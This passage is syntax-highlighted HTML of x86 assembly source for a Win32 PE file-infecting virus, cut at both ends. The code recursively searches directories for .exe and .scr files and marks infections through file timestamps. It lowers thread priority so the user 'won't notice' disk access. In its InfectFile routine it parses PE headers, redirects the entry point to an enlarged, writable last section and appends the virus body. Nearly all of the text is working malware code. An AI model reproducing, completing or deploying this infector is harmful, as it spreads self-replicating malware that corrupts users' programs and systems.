             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2C</span><span class="sc4">],</span><span class="sc2">2E</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">NextFile</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; al = file attributes</span><span class="sc0">
             </span><span class="sc6">test</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsFileOk</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2C</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">CurDirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">AddDir</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">movsb</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">AddDir</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">             </span><span class="sc6">stosb</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">CurDirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">StartSearch</span><span class="sc0">

             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CurDirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">

</span><span class="sc5">IsFileOk</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2C</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">GetFileExtent</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">lodsb</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">GetFileExtent</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020</span><span class="sc0">


</span><span class="sc1">; if the host is a normal exe file, the thread priority</span><span class="sc0">
</span><span class="sc1">; will decrease, so that the user won't notice too much</span><span class="sc0">
</span><span class="sc1">; file access</span><span class="sc0">


             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' exe'</span><span class="sc0">                       </span><span class="sc1">; .exe</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">isScr</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ThreadSpeed</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],-</span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">; Lowest Priority</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Executable</span><span class="sc0">


</span><span class="sc1">; if the host is a screensaver, we will increase the</span><span class="sc0">
</span><span class="sc1">; thread priority, to infect the HD at full speed</span><span class="sc0">


</span><span class="sc5">isScr</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' rcs'</span><span class="sc0">                       </span><span class="sc1">; .scr</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">                   

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ThreadSpeed</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],+</span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">; Highest Priority</span><span class="sc0">

</span><span class="sc5">Executable</span><span class="sc4">:</span><span class="sc0">
             
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">],</span><span class="sc2">4000</span><span class="sc0">        </span><span class="sc1">; minimum filesize</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">; FileDate</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">                                  
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">      </span><span class="sc1">; CreationTime</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FileTimeToDosDateTime</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">FileTime</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; self-infection test</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc5">FileDate</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; program infected if :</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0F</span><span class="sc0">                     </span><span class="sc1">; CreationTime verifies</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                     </span><span class="sc1">;  (seconds and 0F)</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">SelF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; xor (days and 0F)</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">            </span><span class="sc1">; = mask</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">InfectFile</span><span class="sc0">

</span><span class="sc5">NextFile</span><span class="sc4">:</span><span class="sc0">             

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FindNextFileA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">FileTest</span><span class="sc0">

</span><span class="sc5">EndSearch</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FindClose</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">CurDirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">movsb</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2C</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">GetFileName</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">movsb</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">GetFileName</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">02</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lopen</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">OpenOk</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OpenOk</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">600</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lread</span><span class="sc0">

</span><span class="sc1">; --------------</span><span class="sc0">

</span><span class="sc1">;            jmp          ExitInfect                ; only for debug</span><span class="sc0">

</span><span class="sc1">; --------------</span><span class="sc0">


             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">       </span><span class="sc1">; DOS EXE</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">ExitInfect</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">],</span><span class="sc2">0040</span><span class="sc0">  </span><span class="sc1">; windows executable</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc5">ExitInfect</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3C</span><span class="sc4">],</span><span class="sc2">0300</span><span class="sc0">  </span><span class="sc1">; make sure DOS header</span><span class="sc0">
             </span><span class="sc6">ja</span><span class="sc0">           </span><span class="sc5">ExitInfect</span><span class="sc0">                </span><span class="sc1">; is not too big</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3C</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; add PE Hedaer offset</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">00004550</span><span class="sc0">  </span><span class="sc1">; PE signature</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">ExitInfect</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">],</span><span class="sc2">014C</span><span class="sc0">  </span><span class="sc1">; 386</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc5">ExitInfect</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">],</span><span class="sc2">014F</span><span class="sc0">  </span><span class="sc1">; Pentium</span><span class="sc0">
             </span><span class="sc6">ja</span><span class="sc0">           </span><span class="sc5">ExitInfect</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5C</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; don't infect native</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">ExitInfect</span><span class="sc0">                </span><span class="sc1">; subsystem programs</span><span class="sc0">
                                                    </span><span class="sc1">; like ntoskrnl</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; ImageBase</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; + EntryPoint</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">EntryPoint</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; = old EntryPoint</span><span class="sc0">

             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;   number of sections</span><span class="sc0">
             </span><span class="sc6">dec</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; - 1</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">               </span><span class="sc1">; * 28h</span><span class="sc0">
             </span><span class="sc6">mul</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc0">                  </span><span class="sc1">; + Image Optional Header Size</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;   &amp; Image Data Directory</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">18</span><span class="sc0">               </span><span class="sc1">; + Portable Executable Header Size</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">; = last section offset</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0C</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;   Section Address</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; + Raw Data Size</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; = new EntryPoint</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">],</span><span class="sc2">80000000</span><span class="sc0"> </span><span class="sc1">; must be writeable</span><span class="sc0">
                                                 
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Raw Data Size</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; -&gt; Section Size</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; + Section Physical Offset</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">VirusOffset</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; = Virus Offset</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; file size</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2000</span><span class="sc0">             </span><span class="sc1">; don't infect self-</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">              </span><span class="sc1">; extracting programs</span><span class="sc0">
             </span><span class="sc6">ja</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ExitInfect</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc4">],</span><span class="sc5">RawVSize</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">],</span><span class="sc5">RawVSize</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc4">],</span><span class="sc5">RawVSize</span><span class="sc0">  </span><span class="sc1">; + 1000h</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
